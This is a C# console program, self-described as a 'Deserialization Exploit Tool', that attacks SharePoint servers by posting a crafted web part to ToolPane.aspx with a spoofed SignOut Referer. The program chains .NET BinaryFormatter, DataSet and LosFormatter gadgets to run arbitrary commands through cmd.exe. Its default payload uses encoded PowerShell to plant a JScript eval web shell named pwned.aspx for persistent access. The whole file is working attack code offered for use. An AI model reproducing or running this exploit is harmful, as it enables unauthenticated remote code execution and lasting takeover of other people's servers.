using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Web.UI;

namespace ConsoleApp2
{
    internal class Program
    {
        class Exploit
        {
            private string _targetUrl;
            private string _userAgent;
            private HttpClient _client;

            private string _cmdLine;

            public Exploit(string targetUrl, string cmdLine)
            {
                _targetUrl = targetUrl;
                _userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0";
                _client = new HttpClient();
                _client.DefaultRequestHeaders.UserAgent.ParseAdd(_userAgent);
                _cmdLine = cmdLine;
            }

            public async Task<string> SendExploitAsync()
            {
                try
                {
                    WebPartCustom dwp = new WebPartCustom(_cmdLine);
                     
                    string targetUriValue = $"{_targetUrl}_controltemplates/15/ActionBar.ascx";
                    string encodedTargetUri = System.Net.WebUtility.UrlEncode(targetUriValue);
                    //string encodedPayload = System.Net.WebUtility.UrlEncode(payloadBase64);
                    string encodedPayload = System.Net.WebUtility.UrlEncode(dwp.Generate());

                    //Console.WriteLine(encodedPayload);
                    string finalUrl = _targetUrl + "_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx";

                    string bodyData = $"MSOTlPn_Uri={encodedTargetUri}&MSOTlPn_DWP={encodedPayload}";

                    var content = new StringContent(bodyData, Encoding.UTF8, "application/x-www-form-urlencoded");

                    _client.DefaultRequestHeaders.Clear();

                    _client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", _userAgent);
                    _client.DefaultRequestHeaders.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    _client.DefaultRequestHeaders.TryAddWithoutValidation("Accept-Encoding", "gzip, deflate, br");
                    _client.DefaultRequestHeaders.TryAddWithoutValidation("Referer", "/_layouts/SignOut.aspx");
                    _client.DefaultRequestHeaders.Connection.Add("close");

                    Console.WriteLine($"[*] Sending exploit to {finalUrl}...");

            
                    HttpResponseMessage response = await _client.PostAsync(finalUrl, content);

                    string responseString = await response.Content.ReadAsStringAsync();

                    return $"[+] Status: {response.StatusCode} | Len: {responseString.Length}";
                }
                catch (Exception ex)
                {
                    return $"[-] Failed: {ex.Message}";
                }
            }
        }


        [Serializable]
        class DataSetCustom : ISerializable
        {
            private string _cmdLine;
            public string LosFormatterPayload { get; private set; }

            public DataSetCustom(string cmdLine)
            {
                _cmdLine = cmdLine;
            }

            public void GenerateLosFormatterPayload()
            {
                Comparison<string> comp = new Comparison<string>(String.Compare);
                comp += comp;
                comp += comp;
                comp += comp;
                IComparer<string> icomp = Comparer<string>.Create(comp);
                SortedSet<string> set = new SortedSet<string>(icomp);

                set.Add("cmd.exe");
                set.Add("/c " + _cmdLine);

                FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
                object[] invoke_list = comp.GetInvocationList();
                invoke_list[4] = new Func<string, string, Process>(Process.Start);
                fi.SetValue(comp, invoke_list);

                LosFormatter lf = new LosFormatter();
                using (var sw = new StringWriter())
                {
                    lf.Serialize(sw, set);

                    LosFormatterPayload = sw.ToString();

                    Console.WriteLine("LosFormatter Payload generated!");
                }
            }


            public void GetObjectData(SerializationInfo info, StreamingContext cont)
            {
                info.SetType(typeof(System.Data.DataSet));

                info.AssemblyName = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

                string schema = @"<?xml version=""1.0"" encoding=""utf-16""?>
                <xs:schema id=""dataset"" xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
                  <xs:element name=""dataset"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
                    <xs:complexType>
                      <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
                        <xs:element name=""test"">
                          <xs:complexType>
                            <xs:sequence>
                              <xs:element name=""pwn"" msdata:DataType=""System.Collections.Generic.List`1[[System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"" type=""xs:anyType"" minOccurs=""0"" />
                            </xs:sequence>
                          </xs:complexType>
                        </xs:element>
                      </xs:choice>
                    </xs:complexType>
                  </xs:element>
                </xs:schema>";
                info.AddValue("XmlSchema", schema);

                string diffGramTemplate = @"<diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
                <dataset>
                    <test diffgr:id=""Table"" msdata:rowOrder=""0"" diffgr:hasChanges=""inserted"">
                    <pwn xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
                        <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
                        <ExpandedElement/>
                        <ProjectedProperty0>
                            <MethodName>Deserialize</MethodName>
                            <MethodParameters>
                            <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">{0}</anyType>
                            </MethodParameters>
                            <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
                        </ProjectedProperty0>
                        </ExpandedWrapperOfLosFormatterObjectDataProvider>
                    </pwn>
                    </test>
                </dataset>
                </diffgr:diffgram>";

                info.AddValue("XmlDiffGram", string.Format(diffGramTemplate, this.LosFormatterPayload));
            }
        }

        class WebPartCustom
        {
            private string finalWebPart;

            private string _cmdLine;

            public WebPartCustom(string cmdLine)
            {
                _cmdLine = cmdLine;
            }

            public string Generate()
            {
                DataSetCustom dsc = new DataSetCustom(_cmdLine);
                string binaryFormatterPayload;
                BinaryFormatter bf = new BinaryFormatter();
                dsc.GenerateLosFormatterPayload();

                using (var ms = new MemoryStream())
                {
                    bf.Serialize(ms, dsc);
                    binaryFormatterPayload = Convert.ToBase64String(ms.ToArray());
                    byte[] rawBytes = ms.ToArray();

                    using (var compressedMs = new MemoryStream())
                    {
                        using (var gzip = new GZipStream(compressedMs, CompressionMode.Compress))
                        {
                            gzip.Write(rawBytes, 0, rawBytes.Length);
                        }

                        binaryFormatterPayload = Convert.ToBase64String(compressedMs.ToArray());
                    }
                    ms.Position = 0;


                }

                string finalWebPart = string.Format(@"<%@ Register Tagprefix=""ScorecardClient"" Namespace=""Microsoft.PerformancePoint.Scorecards"" Assembly=""Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"" %>
                    <asp:UpdateProgress ID=""Update"" DisplayAfter=""1"" runat=""server"">
                        <ProgressTemplate>
                            <div>            
                                <ScorecardClient:ExcelDataSet CompressedDataTable=""{0}"" DataTable-CaseSensitive=""false"" runat=""server""/>
                            </div>
                        </ProgressTemplate>
                    </asp:UpdateProgress>", binaryFormatterPayload);
                Console.WriteLine(finalWebPart);

                return finalWebPart;
            }
        }

        static async Task Main(string[] args)
        {
            string targetUrl = null;
            string cmdLine = null;

            

            // Simple Argument Parser
            if (args.Length == 0 || args.Contains("-h") || args.Contains("--help"))
            {
                ShowHelp();
                return;
            }

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-t" && i + 1 < args.Length)
                {
                    targetUrl = args[++i];
                }
                else if (args[i] == "-c" && i + 1 < args.Length)
                {
                    cmdLine = args[++i];
                }
            }

            if (string.IsNullOrEmpty(targetUrl))
            {
                Console.WriteLine("[-] Error: Missing required arguments.");
                ShowHelp();
                return;
            }
            //


            if (string.IsNullOrEmpty(cmdLine))
            {
                Console.WriteLine("[*] No custom command provided. Using default persistence shell payload...");

                
                string shellContent = "<%@ Page Language='Jscript'%><%eval(Request.Item['cmd'],'unsafe');%>";
                string shellPath = @"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\pwned.aspx";

                string rawPsCmd = $"[System.IO.File]::WriteAllText('{shellPath}', \"{shellContent}\")";
                string b64Cmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawPsCmd));

                cmdLine = $"powershell -NoProfile -NonInteractive -EncodedCommand {b64Cmd}";
            }

            if (!targetUrl.EndsWith("/")) targetUrl += "/";

            Console.WriteLine($"[*] Target: {targetUrl}");
            Console.WriteLine($"[*] Command: {cmdLine}");

            Exploit exp = new Exploit(targetUrl, cmdLine);
            string result = await exp.SendExploitAsync();
            Console.WriteLine(result);
        }

        static void ShowHelp()
        {
            Console.WriteLine("\n[#] Deserialization Exploit Tool");
            Console.WriteLine("Usage: Poc.exe -t <target_url> -c <command>");
            Console.WriteLine("\nOptions:");
            Console.WriteLine("  -t <url>      The target base URL (e.g., http://192.168.1.10/)");
            Console.WriteLine("  -c <cmd>      The system command to execute (e.g., \"whoami\")");
            Console.WriteLine("  -h            Show this help message\n");
        }
    }
}
